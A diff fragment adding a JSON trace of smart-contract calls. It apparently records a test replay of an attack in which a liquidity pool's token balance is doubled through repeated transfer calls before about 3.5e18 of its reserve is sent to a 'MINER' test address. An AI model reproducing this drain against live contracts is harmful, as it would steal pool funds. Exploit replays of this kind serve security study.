+        "return_value": "5587538138869999999986862 [5.587e24]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 5497558138880000000000000 [5.497e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "11085096277749999999986862 [1.108e25]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 10995116277760000000000000 [1.099e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "22080212555509999999986862 [2.208e25]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 21990232555520000000000000 [2.199e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "44070445111029999999986862 [4.407e25]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 43980465111040000000000000 [4.398e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "88050910222069999999986862 [8.805e25]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 87960930222080000000000000 [8.796e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "176011840444149999999986862 [1.76e26]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 175921860444160000000000000 [1.759e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "351933700888309999999986862 [3.519e26]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 351843720888320000000000000 [3.518e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "703777421776629999999986862 [7.037e26]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 703687441776640000000000000 [7.036e26]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "1407464863553269999999986862 [1.407e27]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 1407374883553280000000000000 [1.407e27]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "2814839747106549999999986862 [2.814e27]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 2814749767106560000000000000 [2.814e27]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "5629589514213109999999986862 [5.629e27]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 5629499534213120000000000000 [5.629e27]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18393",
+        "args": "0, 3500751853374879579 [3.5e18], MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3262",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3500751853374879579 [3.5e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "11259089048426229999999986862 [1.125e28]"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "28047530478625 [2.804e13]"
+    },
+    {
+        "id": "3262",
+        "args": "0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d, 10000000000000000000 [1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d",
+        "original_code": null,
+        "description": null,
+        "return_value": "195226137444349164425 [1.952e20]"
+    },
+    {
+        "id": "2531",
+        "args": "0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d",
+        "original_code": null,
+        "description": null,
+        "return_value": "194218402905226467218784 [1.942e23]"
+    },
+    {
+        "id": "534",
+        "args": "0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d",
+        "original_code": null,
+        "description": null,
+        "return_value": "195226137444349164425 [1.952e20]"
+    },
+    {
+        "id": "531",
+        "args": "0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d",
+        "original_code": null,
+        "description": null,
+        "return_value": "194218402905226467218784 [1.942e23]"
+    },
+    {
+        "id": "534",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500751852984842483 [3.5e18]"
+    }
+]
